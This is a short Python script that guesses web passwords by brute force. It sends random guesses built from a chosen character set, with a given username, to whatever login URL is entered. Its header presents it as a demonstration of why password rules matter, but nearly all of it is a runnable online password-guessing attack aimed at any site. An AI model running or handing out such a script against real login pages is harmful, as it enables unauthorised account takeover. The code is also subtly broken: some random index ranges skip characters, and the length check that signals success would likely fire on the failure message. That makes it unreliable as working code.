### Very simple python script wich tries to randomly guess passwords . This serves to show the importance of minimum lenght + special characters password requirements

from random import *
import requests
import time

pass_len = input("Enter password len:")
user = input("Username you wish to crack:")
dic= input("Choose which type of dictionary to use :"+"\n"+ "1 - abc..." +"\n"+"2 - 123... " + "\n" + "3 - abc..123..." + "\n" + "4 - abc...ABC...123..."+"\n")
url=input("What's the url to attack ?" +"\n")

chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j','k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't','u','v',  'w', 'x', 'y', 'z']

chars_digits = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j','k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't','u','v',  'w', 'x', 'y', 'z', '1', '2','3','4','5','6','7','8','9','0']

chars_upper_digits = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j','k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't','u','v', 'w', 'x', 'y', 'z', '1', '2','3','4','5','6','7','8','9','0',
                        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J','K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T','U','V', 'W', 'X', 'Y', 'Z']

digits = ['1','2','3','4','5','6','7','8','9','0']
start_time = time.time()
cracked_pass = ""
while (1):
    cracked_pass = ""
    for letter in range(int(pass_len)):
      if int(dic) == 1:
          cracked_pass_letter = chars[randint(0, 25)]
          cracked_pass = str(cracked_pass_letter) + str(cracked_pass)
        
      elif int(dic) == 2:
          cracked_pass_letter = digits[randint(0, 9)]
          cracked_pass = str(cracked_pass_letter) + str(cracked_pass)
        
      elif int(dic) == 3:
          cracked_pass_letter = chars_digits[randint(0, 34)]
          cracked_pass = str(cracked_pass_letter) + str(cracked_pass)
      else:
          cracked_pass_letter = chars_upper_digits[randint(0, 59)]
          cracked_pass = str(cracked_pass_letter) + str(cracked_pass)        
    
    print(cracked_pass)
    data = {"username": user , "password":cracked_pass}
    #url = "http://localhost:4000/auth"
    response = requests.post(url, data)
    if(len(response.text)> 36): # 36 due to "RESPONSE Incorrect Username and/or Password!" is the response from the serve in case 
              break                    #of an incorrect login, so we can check for a correct login when we get the source code of the page, wich will be bigger thn 36 for sure
    
      

print("We got the password for "+user + ", it is :",cracked_pass)
print("--- it took %s minutes ---" % ((time.time() - start_time)/60))
